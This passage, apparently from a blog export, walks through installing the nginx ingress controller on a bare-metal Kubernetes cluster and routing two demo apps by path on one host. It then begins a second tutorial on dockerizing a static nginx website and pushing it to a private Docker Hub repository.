installtion is finished! So Let’s check the services again in our cluster !</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">raf²@4n6nk8s-master$ kubectl get svc</span><br><span class=\"line\">NAME              TYPE           CLUSTER-IP       EXTERNAL-IP     PORT(S)        AGE</span><br><span class=\"line\">4n6nk8s-kitchen   LoadBalancer   10.97.71.78      192.168.1.241   80:30918/TCP   5m4s</span><br><span class=\"line\">kubernetes        ClusterIP      10.96.0.1        &lt;none&gt;          443/TCP        5d11h</span><br></pre></td></tr></table></figure>\n<p>Bingo! our Load Balancer service has an external IP address. So our deployment is accessable through this IP! Let’s check it:<br>\nٍ<img data-src=\"https://imgur.com/jWkr5kf.png\" alt=\"\"><br>\nEverything is OK! now we can say that we have a Load Balancer on our bare metal cluster!</p>\n<h1 id=\"install-the-nginx-ingress-controller\"><a class=\"markdownIt-Anchor\" href=\"#install-the-nginx-ingress-controller\">#</a> Install the nginx Ingress Controller:</h1>\n<p>Installing the nginx ingress controller can be done either by using Helm or the yaml manifest provided in the nginx controller website</p>\n<h2 id=\"install-the-controller-using-helm\"><a class=\"markdownIt-Anchor\" href=\"#install-the-controller-using-helm\">#</a> Install the controller using Helm</h2>\n<p>If you have Helm, you can deploy the ingress controller with the following command:</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">raf²@4n6nk8s-master$ helm upgrade --install ingress-nginx ingress-nginx \\</span><br><span class=\"line\">  --repo https://kubernetes.github.io/ingress-nginx \\</span><br><span class=\"line\">  --namespace ingress-nginx --create-namespace</span><br></pre></td></tr></table></figure>\n<h2 id=\"install-the-controller-using-yaml-manifest\"><a class=\"markdownIt-Anchor\" href=\"#install-the-controller-using-yaml-manifest\">#</a> Install the controller using yaml manifest:</h2>\n<p>If you don’t have Helm or if you prefer to use a YAML manifest, you can run the following command instead:</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">raf²@4n6nk8s-master$ kubectl apply -f https://raw.githubusercontent.com/kubernetes/ingress-nginx/controller-v1.2.0/deploy/static/provider/cloud/deploy.yaml</span><br><span class=\"line\"></span><br><span class=\"line\">namespace/ingress-nginx created</span><br><span class=\"line\">serviceaccount/ingress-nginx created</span><br><span class=\"line\">serviceaccount/ingress-nginx-admission created</span><br><span class=\"line\">role.rbac.authorization.k8s.io/ingress-nginx created</span><br><span class=\"line\">role.rbac.authorization.k8s.io/ingress-nginx-admission created</span><br><span class=\"line\">clusterrole.rbac.authorization.k8s.io/ingress-nginx created</span><br><span class=\"line\">clusterrole.rbac.authorization.k8s.io/ingress-nginx-admission created</span><br><span class=\"line\">rolebinding.rbac.authorization.k8s.io/ingress-nginx created</span><br><span class=\"line\">rolebinding.rbac.authorization.k8s.io/ingress-nginx-admission created</span><br><span class=\"line\">clusterrolebinding.rbac.authorization.k8s.io/ingress-nginx created</span><br><span class=\"line\">clusterrolebinding.rbac.authorization.k8s.io/ingress-nginx-admission created</span><br><span class=\"line\">configmap/ingress-nginx-controller created</span><br><span class=\"line\">service/ingress-nginx-controller created</span><br><span class=\"line\">service/ingress-nginx-controller-admission created</span><br><span class=\"line\">deployment.apps/ingress-nginx-controller created</span><br><span class=\"line\">job.batch/ingress-nginx-admission-create created</span><br><span class=\"line\">job.batch/ingress-nginx-admission-patch created</span><br><span class=\"line\">ingressclass.networking.k8s.io/nginx created</span><br><span class=\"line\">validatingwebhookconfiguration.admissionregistration.k8s.io/ingress-nginx-admission created</span><br></pre></td></tr></table></figure>\n<h2 id=\"check-the-nginx-ingress-controller\"><a class=\"markdownIt-Anchor\" href=\"#check-the-nginx-ingress-controller\">#</a> Check the Nginx Ingress Controller:</h2>\n<p>Let’s check the pods created in the namespace of the ingress-nginx</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">raf²@4n6nk8s-master$ kubectl get pods --namespace=ingress-nginx</span><br><span class=\"line\"></span><br><span class=\"line\">NAME                                        READY   STATUS              RESTARTS   AGE</span><br><span class=\"line\">ingress-nginx-admission-create-qd8fz        0/1     ContainerCreating   0          10s</span><br><span class=\"line\">ingress-nginx-admission-patch-76lgl         0/1     ContainerCreating   0          10s</span><br><span class=\"line\">ingress-nginx-controller-7575567f98-hg6tq   0/1     ContainerCreating   0          10s</span><br></pre></td></tr></table></figure>\n<p>After waiting a few minute until the controller is ready, we must check all the services and deployments of the ingress-nginx namespace again ! You must find an output similar to the following</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">raf²@4n6nk8s-master$ kubectl get all -n ingress-nginx</span><br><span class=\"line\"></span><br><span class=\"line\">NAME                                            READY   STATUS      RESTARTS        AGE</span><br><span class=\"line\">pod/ingress-nginx-admission-create-9dshm        0/1     Completed   0               23m</span><br><span class=\"line\">pod/ingress-nginx-admission-patch-rj7gk         0/1     Completed   0               23m</span><br><span class=\"line\">pod/ingress-nginx-controller-7575567f98-8w6pm   1/1     Running     0               23m</span><br><span class=\"line\"></span><br><span class=\"line\">NAME                                         TYPE           CLUSTER-IP       EXTERNAL-IP     PORT(S)                      AGE</span><br><span class=\"line\">service/ingress-nginx-controller             LoadBalancer   10.100.234.221   192.168.1.240   80:32545/TCP,443:31214/TCP   23m</span><br><span class=\"line\">service/ingress-nginx-controller-admission   ClusterIP      10.109.162.157   &lt;none&gt;          443/TCP                      23m</span><br><span class=\"line\"></span><br><span class=\"line\">NAME                                       READY   UP-TO-DATE   AVAILABLE   AGE</span><br><span class=\"line\">deployment.apps/ingress-nginx-controller   1/1     1            1           23m</span><br><span class=\"line\"></span><br><span class=\"line\">NAME                                                  DESIRED   CURRENT   READY   AGE</span><br><span class=\"line\">replicaset.apps/ingress-nginx-controller-7575567f98   1         1         1       23m</span><br><span class=\"line\"></span><br><span class=\"line\">NAME                                       COMPLETIONS   DURATION   AGE</span><br><span class=\"line\">job.batch/ingress-nginx-admission-create   1/1           3s         23m</span><br><span class=\"line\">job.batch/ingress-nginx-admission-patch    1/1           4s         23m</span><br></pre></td></tr></table></figure>\n<p>Bingo! the ingress controller is ready and on running state! also is exposed with Load Balancer and it have a Extenal-IP  <code>192.168.1.240</code> <br>\nNow we can deploy an ingress object without any problem ! It’s time to deploy our 2 apps with ingress in one single domain name and one IP address !</p>\n<h1 id=\"deploy-the-two-apps-using-ingress\"><a class=\"markdownIt-Anchor\" href=\"#deploy-the-two-apps-using-ingress\">#</a> Deploy The two Apps using Ingress:</h1>\n<p>Let’s start by deploying the apps and expose it with Cluster IP service !</p>\n<figure class=\"highlight yaml\"><figcaption><span>Gym App Deployment</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">apps/v1</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">Deployment</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\">  <span class=\"attr\">name:</span> <span class=\"string\">4n6nk8s-gym</span></span><br><span class=\"line\"><span class=\"attr\">spec:</span></span><br><span class=\"line\">  <span class=\"attr\">replicas:</span> <span class=\"number\">1</span></span><br><span class=\"line\">  <span class=\"attr\">selector:</span></span><br><span class=\"line\">    <span class=\"attr\">matchLabels:</span></span><br><span class=\"line\">      <span class=\"attr\">app:</span> <span class=\"string\">gym</span></span><br><span class=\"line\">  <span class=\"attr\">template:</span></span><br><span class=\"line\">    <span class=\"attr\">metadata:</span></span><br><span class=\"line\">      <span class=\"attr\">labels:</span></span><br><span class=\"line\">        <span class=\"attr\">app:</span> <span class=\"string\">gym</span></span><br><span class=\"line\">    <span class=\"attr\">spec:</span></span><br><span class=\"line\">      <span class=\"attr\">containers:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">gym-app</span></span><br><span class=\"line\">        <span class=\"attr\">image:</span> <span class=\"string\">mohamedrafraf/k8s-gym</span></span><br><span class=\"line\">        <span class=\"attr\">ports:</span></span><br><span class=\"line\">        <span class=\"bullet\">-</span> <span class=\"attr\">containerPort:</span> <span class=\"number\">80</span></span><br><span class=\"line\"><span class=\"meta\">---</span></span><br><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">v1</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">Service</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\">  <span class=\"attr\">name:</span> <span class=\"string\">gym-svc</span></span><br><span class=\"line\"><span class=\"attr\">spec:</span></span><br><span class=\"line\">  <span class=\"attr\">selector:</span></span><br><span class=\"line\">    <span class=\"attr\">app:</span> <span class=\"string\">gym</span></span><br><span class=\"line\">  <span class=\"attr\">type:</span> <span class=\"string\">ClusterIP</span></span><br><span class=\"line\">  <span class=\"attr\">ports:</span></span><br><span class=\"line\">  <span class=\"bullet\">-</span> <span class=\"attr\">protocol:</span> <span class=\"string\">TCP</span></span><br><span class=\"line\">    <span class=\"attr\">port:</span> <span class=\"number\">80</span></span><br></pre></td></tr></table></figure>\n<p>Create the deployment and service of the gym app</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">raf²@4n6nk8s-master$ kubectl apply -f gym-deployment.yaml</span><br><span class=\"line\">deployment.apps/4n6nk8s-gym created</span><br><span class=\"line\">raf²@4n6nk8s-master$ kubectl apply -f gym-svc.yaml</span><br><span class=\"line\">service/gym-svc created</span><br></pre></td></tr></table></figure>\n<p>The manifest of the restaurant app and the service:</p>\n<figure class=\"highlight yaml\"><figcaption><span>Restaurant App Deployment</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">apps/v1</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">Deployment</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\">  <span class=\"attr\">name:</span> <span class=\"string\">4n6nk8s-kitchen</span></span><br><span class=\"line\"><span class=\"attr\">spec:</span></span><br><span class=\"line\">  <span class=\"attr\">replicas:</span> <span class=\"number\">1</span></span><br><span class=\"line\">  <span class=\"attr\">selector:</span></span><br><span class=\"line\">    <span class=\"attr\">matchLabels:</span></span><br><span class=\"line\">      <span class=\"attr\">app:</span> <span class=\"string\">kitchen</span></span><br><span class=\"line\">  <span class=\"attr\">template:</span></span><br><span class=\"line\">    <span class=\"attr\">metadata:</span></span><br><span class=\"line\">      <span class=\"attr\">labels:</span></span><br><span class=\"line\">        <span class=\"attr\">app:</span> <span class=\"string\">kitchen</span></span><br><span class=\"line\">    <span class=\"attr\">spec:</span></span><br><span class=\"line\">      <span class=\"attr\">containers:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">kitchen-app</span></span><br><span class=\"line\">        <span class=\"attr\">image:</span> <span class=\"string\">mohamedrafraf/k8s-kitchen</span></span><br><span class=\"line\">        <span class=\"attr\">ports:</span></span><br><span class=\"line\">        <span class=\"bullet\">-</span> <span class=\"attr\">containerPort:</span> <span class=\"number\">80</span></span><br><span class=\"line\"><span class=\"meta\">---</span></span><br><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">v1</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">Service</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\">  <span class=\"attr\">name:</span> <span class=\"string\">kitchen-svc</span></span><br><span class=\"line\"><span class=\"attr\">spec:</span></span><br><span class=\"line\">  <span class=\"attr\">selector:</span></span><br><span class=\"line\">    <span class=\"attr\">app:</span> <span class=\"string\">kitchen</span></span><br><span class=\"line\">  <span class=\"attr\">type:</span> <span class=\"string\">ClusterIP</span></span><br><span class=\"line\">  <span class=\"attr\">ports:</span></span><br><span class=\"line\">  <span class=\"bullet\">-</span> <span class=\"attr\">protocol:</span> <span class=\"string\">TCP</span></span><br><span class=\"line\">    <span class=\"attr\">port:</span> <span class=\"number\">80</span></span><br></pre></td></tr></table></figure>\n<p>Create the restaurant deployment and the service:</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">raf²@4n6nk8s-master$ kubectl apply -f kitchen-deployment.yaml</span><br><span class=\"line\">deployment.apps/4n6nk8s-kitchen created</span><br><span class=\"line\">raf²@4n6nk8s-master$ kubectl apply -f kitchen-svc.yaml</span><br><span class=\"line\">service/kitchen-svc created</span><br></pre></td></tr></table></figure>\n<p>Check the deployments and the services! :</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">raf²@4n6nk8s-master$ kubectl get all</span><br><span class=\"line\">NAME                                   READY   STATUS    RESTARTS   AGE</span><br><span class=\"line\">pod/4n6nk8s-gym-698f44db99-29dnr       1/1     Running   0          63s</span><br><span class=\"line\">pod/4n6nk8s-kitchen-6b56959b86-n7c9z   1/1     Running   0          46s</span><br><span class=\"line\"></span><br><span class=\"line\">NAME                        TYPE        CLUSTER-IP       EXTERNAL-IP   PORT(S)    AGE</span><br><span class=\"line\">service/gym-svc             ClusterIP   10.110.191.206   &lt;none&gt;        80/TCP     53s</span><br><span class=\"line\">service/kitchen-svc         ClusterIP   10.102.94.94     &lt;none&gt;        80/TCP     39s</span><br><span class=\"line\">service/kubernetes          ClusterIP   10.96.0.1        &lt;none&gt;        443/TCP    3d14h</span><br><span class=\"line\"></span><br><span class=\"line\">NAME                              READY   UP-TO-DATE   AVAILABLE   AGE</span><br><span class=\"line\">deployment.apps/4n6nk8s-gym       1/1     1            1           63s</span><br><span class=\"line\">deployment.apps/4n6nk8s-kitchen   1/1     1            1           46s</span><br><span class=\"line\"></span><br><span class=\"line\">NAME                                         DESIRED   CURRENT   READY   AGE</span><br><span class=\"line\">replicaset.apps/4n6nk8s-gym-698f44db99       1         1         1       63s</span><br><span class=\"line\">replicaset.apps/4n6nk8s-kitchen-6b56959b86   1         1         1       46s</span><br></pre></td></tr></table></figure>\n<p>Let’s now create the ingress manifest:</p>\n<figure class=\"highlight yaml\"><figcaption><span>Ingress YAML Definition</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">networking.k8s.io/v1</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">Ingress</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\">  <span class=\"attr\">annotations:</span></span><br><span class=\"line\">    <span class=\"attr\">nginx.ingress.kubernetes.io/rewrite-target:</span> <span class=\"string\">/</span></span><br><span class=\"line\">  <span class=\"attr\">name:</span> <span class=\"string\">ingress-4n6nk8s</span></span><br><span class=\"line\"><span class=\"attr\">spec:</span></span><br><span class=\"line\">  <span class=\"attr\">ingressClassName:</span> <span class=\"string\">nginx</span></span><br><span class=\"line\">  <span class=\"attr\">rules:</span></span><br><span class=\"line\">  <span class=\"bullet\">-</span> <span class=\"attr\">host:</span> <span class=\"string\">justk8s.k8s</span></span><br><span class=\"line\">    <span class=\"attr\">http:</span></span><br><span class=\"line\">      <span class=\"attr\">paths:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">path:</span> <span class=\"string\">/kitchen</span></span><br><span class=\"line\">        <span class=\"attr\">pathType:</span> <span class=\"string\">Prefix</span></span><br><span class=\"line\">        <span class=\"attr\">backend:</span></span><br><span class=\"line\">          <span class=\"attr\">service:</span></span><br><span class=\"line\">            <span class=\"attr\">name:</span> <span class=\"string\">kitchen-svc</span></span><br><span class=\"line\">            <span class=\"attr\">port:</span></span><br><span class=\"line\">              <span class=\"attr\">number:</span> <span class=\"number\">80</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">path:</span> <span class=\"string\">/gym</span></span><br><span class=\"line\">        <span class=\"attr\">pathType:</span> <span class=\"string\">Prefix</span></span><br><span class=\"line\">        <span class=\"attr\">backend:</span></span><br><span class=\"line\">          <span class=\"attr\">service:</span></span><br><span class=\"line\">            <span class=\"attr\">name:</span> <span class=\"string\">gym-svc</span></span><br><span class=\"line\">            <span class=\"attr\">port:</span></span><br><span class=\"line\">              <span class=\"attr\">number:</span> <span class=\"number\">80</span></span><br></pre></td></tr></table></figure>\n<p>The  <code>ingressClassName</code>  must be “nginx” since we have nginx ingress controller. The  <code>host</code>  field in the  <code>rules</code>  define the domain name of the request. So if a HTTP request come to the cluster with the host name  <code>justk8s.k8s</code>  this rull will be applied!<br>\nThe the  <code>path</code>  int the  <code>paths</code>  will be the route ! The ingress give you the service in this route!<br>\nIn our Example if we enter  <code>http://justk8s.k8s/kitchen</code>  the ingress will forward the restaurant app!<br>\nin the  <code>path</code>  field we specify the  <code>service</code>  name and the  <code>port number</code></p>\n<p>Now Let’s Create the ingress object</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">raf²@4n6nk8s-master$ kubectl apply -f ingress.yaml</span><br><span class=\"line\">ingress.networking.k8s.io/ingress-4n6nk8s created</span><br></pre></td></tr></table></figure>\n<p>Check the ingerss object !</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">raf²@4n6nk8s-master$ kubectl get ingress</span><br><span class=\"line\">NAME              CLASS   HOSTS         ADDRESS   PORTS   AGE</span><br><span class=\"line\">ingress-4n6nk8s   nginx   justk8s.k8s             80      5s</span><br></pre></td></tr></table></figure>\n<p>Display more details about the ingress object with  <code>kubectl describe ingress</code> :</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">raf²@4n6nk8s-master$ kubectl describe ingress ingress-4n6nk8s</span><br><span class=\"line\">Name:             ingress-4n6nk8s</span><br><span class=\"line\">Labels:           &lt;none&gt;</span><br><span class=\"line\">Namespace:        default</span><br><span class=\"line\">Address:          192.168.1.240</span><br><span class=\"line\">Default backend:  default-http-backend:80 (&lt;error: endpoints <span class=\"string\">&quot;default-http-backend&quot;</span> not found&gt;)</span><br><span class=\"line\">Rules:</span><br><span class=\"line\">  Host         Path  Backends</span><br><span class=\"line\">  ----         ----  --------</span><br><span class=\"line\">  justk8s.k8s</span><br><span class=\"line\">               /kitchen   kitchen-svc:80 (10.1.235.141:80)</span><br><span class=\"line\">               /gym       gym-svc:80 (10.1.235.147:80)</span><br><span class=\"line\">Annotations:   nginx.ingress.kubernetes.io/rewrite-target: /</span><br><span class=\"line\">Events:</span><br><span class=\"line\">  Type    Reason  Age               From                      Message</span><br><span class=\"line\">  ----    ------  ----              ----                      -------</span><br><span class=\"line\">  Normal  Sync    7s (x2 over 19s)  nginx-ingress-controller  Scheduled <span class=\"keyword\">for</span> <span class=\"built_in\">sync</span></span><br></pre></td></tr></table></figure>\n<p>We see that the Default backend display  <code>(&lt;error: endpoints &quot;default-http-backend&quot; not found&gt;)</code> .<br>\nThis error occur because we don’t specify a default backend (route) so when you enter  <code>http://justk8s.k8s/</code>  we will find the nginx 404 not found page !</p>\n<h1 id=\"check-the-deployments\"><a class=\"markdownIt-Anchor\" href=\"#check-the-deployments\">#</a> Check the Deployments!</h1>\n<p>After Installing the LoadBalancer and Ingress Controller. Let’s try to access to our 2 apps. But before access to this apps let’s create an  <code>/etc/hosts</code>  entry ( <code>C:\\Windows\\System32\\Drivers\\etc\\hosts</code>  for Windows):</p>\n<figure class=\"highlight bash\"><figcaption><span>/etc/hosts</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">192.168.1.240 justk8s.k8s <span class=\"comment\"># The IP address of the Load Balancer of the Ingress Controller !</span></span><br></pre></td></tr></table></figure>\n<p>Now Let’s go to our browser! I add this entry in my master node! So I can access to these apps from my master node !:</p>\n<p><img data-src=\"https://imgur.com/p4sAzQX.png\" alt=\"\"><br>\n<img data-src=\"https://imgur.com/tauie6V.png\" alt=\"\"></p>\n<p>Bingo! Everything is Ok !</p>\n"},{"title":"Dockerize a website & Pull it privately in k8s","date":"2022-09-08T00:47:58.000Z","cover":"https://res.cloudinary.com/practicaldev/image/fetch/s--ne7pa20x--/c_imagga_scale,f_auto,fl_progressive,h_900,q_auto,w_1600/https://thepracticaldev.s3.amazonaws.com/i/7xyqmfvmadyqu2girucz.jpg","_content":"\nIn this article you will learn how to containerize a static website using nginx. Then we will push a private docker image in dockerhub. Finally we will use this private image to be pulled in our Kubernetes cluster ! I will split this article to 2 small and easy steps, you can skip any one you want !\n\n# Containerize a static website and push it on dockerhub\nIn this Section we will choose a template from random websites that provides free css templates, then we will dockerize it !\n\n## Dockerize the website\n\nI'll choose this template from this [link](https://www.free-css.com/free-css-templates/page282/royal-cars)\n![](https://imgur.com/ngHGyw0.png)\n\nDownload it and let's create our Dockerfile ! \nWe will use the `nginx:alpine` image and copy all the assets of the website to the `/usr/share/nginx/html` to be hosted by the nginx webserver. \n\n```Dockerfile\nFROM nginx:alpine\nWORKDIR /usr/share/nginx/html\nRUN rm -rf ./*\nCOPY ./ ./\nRUN chmod +r -R . \nENTRYPOINT [\"nginx\",\"-g\",\"daemon off;\"]\n```\nNow it's time to build the container image \n\n```bash command line prompt\nraf@4n6nk8s:~$ sudo docker build . -t <user_name>/cars-app\nSending build context to Docker daemon  2.454MB\nStep 1/5 : FROM nginx:alpine\nalpine: Pulling from library/nginx\n213ec9aee27d: Downloading [===================================>               ]  2.018MB/2.806MB\n2546ae67167b: Downloading [=========>                                         ]  1.461MB/7.403MB\n23b845224e13: Download complete\n9bd5732789a3: Download complete\n328309e59ded: Waiting\nb231d02e5150: Waiting\n```\nNow let's create a container to test it before make push it! \n\n```bash command line prompt\nraf@4n6nk8s:~$ sudo docker run --name car-demo -p 8686:80 <user_name>/cars-app\n2022/09/08 22:53:47 [notice] 1#1: using the \"epoll\" event method\n2022/09/08 22:53:47 [notice] 1#1: nginx/1.23.1\n2022/09/08 22:53:47 [notice] 1#1: built by gcc 11.2.1 20220219 (Alpine 11.2.1_git20220219)\n2022/09/08 22:53:47 [notice] 1#1: OS: Linux 5.15.0-41-generic\n2022/09/08 22:53:47 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576\n2022/09/08 22:53:47 [notice] 1#1: start worker processes\n2022/09/08 22:53:47 [notice] 1#1: start worker process 7\n2022/09/08 22:53:47 [notice] 1#1: start worker process 8\n2022/09/08 22:53:47 [notice] 1#1: start worker process 9\n2022/09/08 22:53:47 [notice] 1#1: start worker process 10\n```\nSanity Check please ! Oh everything is OK !\n\n![](https://imgur.com/nQ6NcxG.png)\n\n## Push the container image to private repo\n\nNow go and create a private repository in your dockerhub to push it ! \n```bash command line prompt\nraf@4n6nk8s:~$ sudo docker image push <user_name>/cars-app\nUsing default tag: latest\nThe push refers to repository [docker.io/<user_name>/cars-app]\n41c30355eff8: Pushed\nf2ba5e032e84: Pushed\n43e1f37b87cb: Pushed\nbf4e176a4d9b: Mounted from library/nginx\na1d571e4e83d: Mounted from library/nginx\n6d97b4d00719: Mounted from library/nginx\n2a7647ca3937: Mounted from library/nginx\n549c42eea4a6: Mounted from library/nginx\n994393dc58e7: Mounted from library/nginx\n```\nNow it's time to deal with our kubernetes cluster ! \n\n# Use the private docker image in Kubernetes\n\nIn this demo I will use a production kubernetes cluster with 1 master node and 1 worker node \n\n```bash command line prompt \nraf@4n6nk8s:~$ kubectl get nodes\nNAME      STATUS   ROLES                  AGE   VERSION\nmaster    Ready    control-plane,master   77d   